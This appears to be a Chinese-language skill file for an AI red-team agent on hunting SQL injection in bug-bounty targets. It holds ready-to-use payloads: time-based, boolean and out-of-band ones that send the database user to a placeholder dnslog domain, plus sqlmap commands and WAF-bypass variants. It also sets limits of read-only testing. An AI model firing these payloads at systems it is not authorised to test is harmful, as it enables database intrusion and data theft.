---
name: hunt-sqli
description: SQL 注入挖掘：注入点识别矩阵、四类判定 oracle（报错/布尔/时间/带外）、sqlmap 参数化用法与 tamper 选择、ORM/框架高频漏洞点、WAF 对抗变体
whenToUse: 摸到带数据库交互的参数（查询/排序/筛选/JSON 请求体/Header）后做注入面测试；SRC 目标有 WAF 时配合 tamper 变体
role: vuln-scan
enabled: true
---

# SQL 注入挖掘

## 注入点识别（按命中率排序）

| 位置 | 信号 | 示例 |
|---|---|---|
| 排序/筛选字段 | 参数值进 ORDER BY / LIKE，无引号包裹 | `?sort=id`、`?orderBy=createTime desc`、`?filter=status:1` |
| 数字 ID | 直接拼 SQL 的数字参数 | `?id=1`、`/api/goods/123` |
| JSON 请求体 | 嵌套字段常被漏过滤 | `{"userId":1,"orderBy":"id"}` |
| Header | X-Forwarded-For / Referer / User-Agent 常被记库 | 登录日志、风控记录 |
| XML / SOAP | 参数节点无预处理 | `<query>value</query>` |
| GraphQL | argument 直接进 resolver | `query{user(id:"1")}` |
| 二阶注入 | 存进去时没打，读出来拼 SQL 时触发 | 昵称/地址字段 |

## 判定 oracle（从无害到确认）

1. **报错回显**：`'` `"` `)` 单字符探测 → 看响应差异（500 / 自定义错误页 / SQL 片段泄露）。Java 报错常带 Mybatis `###` 片段，可直接定位语句。
2. **布尔差异**：`?id=1 and 1=1` vs `?id=1 and 1=2`，比较**响应长度/状态码/内容字节差**，连打 3 组排除缓存抖动。
3. **时间盲注**：`?id=1 and sleep(3)`（MySQL）/ `?id=1;waitfor delay '0:0:3'--`（MSSQL）/ `?id=1 and dbms_pipe.receive_message('a',3)='a'`（Oracle）。每组测 3 次取均值，对照基线。
4. **带外（最快出网判定）**：MySQL `load_file(concat('\\\\',(select user()),'.<dnslog域>\\a'))`（需 secure_file_priv 允许）；MSSQL `xp_dirtree '\\<dnslog域>\a'`；Oracle `UTL_HTTP.REQUEST`。回连即定性，不拖数据。

## 数据库指纹速判

| Payload 指向 | MySQL | MSSQL | Oracle | PostgreSQL |
|---|---|---|---|---|
| 字符串拼接符 | `'a' 'b'` | 同左 | 同左 | 同左 |
| 版本函数 | `version()`/`@@version` | `@@version` | `select banner from v$version` | `version()` |
| 独有函数 | `sleep()`/`benchmark()` | `waitfor delay` | `dbms_pipe` | `pg_sleep()` |

## sqlmap 标准用法（纪律化）

```bash
# 基线：先单点确认，再交给 sqlmap 深挖；--batch 全自动、--flush-session 防旧缓存
sqlmap -u "https://target/api/goods?id=1" -p id --dbms=mysql --batch --threads=3 --risk=1 --level=1
# POST/JSON：
sqlmap -r req.txt --batch        # req.txt 含完整请求，JSON 请求体加 --header Content-Type: application/json
# 带登录态：
sqlmap -r req.txt --cookie="SESSION=xxx" --batch
# 拖库前先数库：--tables --batch 只到库/表名即停，报 SRC 只需证明能读敏感表
```

**纪律**：
- `--risk=1 --level=1` 起步，确认存在再升；`--risk=3` 会带 UPDATE 语句，**禁用**。
- 只读操作：拖数据到「证明危害」即停（用户表计数、脱敏样例 2-3 行），不 DROP/UPDATE/DELETE。
- 目标限速/风控时降 `--threads=1 --delay=1`。

## WAF 对抗变体（按拦截特征选）

| 拦截特征 | 变体 |
|---|---|
| 拦 `and`/`or` | `&&`、`%26%26`、`||`；`and/**/1=1` 内联注释 |
| 拦空格 | `/**/`、`%09`、`%0a`、括号包裹 `and(1=1)` |
| 拦 `union select` | `union/**/select`、`%0aunion%0aselect`、`union distinct select` |
| 拦 `sleep` | `benchmark(5000000,md5(1))`、`(select(1)from(information_schema.tables)having 1=1)` |
| 拦引号 | 十六进制字符串 `0x61646d696e`、宽字节 `%df'`（GBK 场景） |
| 全拦 | 走时间盲注/带外，或试 tamper：`--tamper=space2comment`、`betweenand`、`charencode`、`randomcase` |

## 框架高频漏洞点

- **Mybatis**：`order by ${}`、`like '%${}%'`、`in (${})` —— `#` 预编译、`$` 直拼，排序字段是重灾区。
- **PHP 老系统**：`$_GET` 直拼、`addslashes` 可被宽字节绕过。
- **Java**:预编译为主，看**拼接进 SQL 的排序/表名/列名**参数。
- **ORM 链式**：Django `extra()`、Rails `order(params)`、Laravel `orderByRaw`。

## 产出约定

- 判定成立时记录：URL、参数、oracle 类型、回连/时延证据、DBMS 指纹。
- 按 `redteam_poc_add` 回填：category=sqli，language=http/python，usage 写清复现命令。

<!-- 改编自: 纯原创方法论汇总（OWASP/PortSwigger 公开知识体系整理，无单一上游）, 2026-10-31 -->

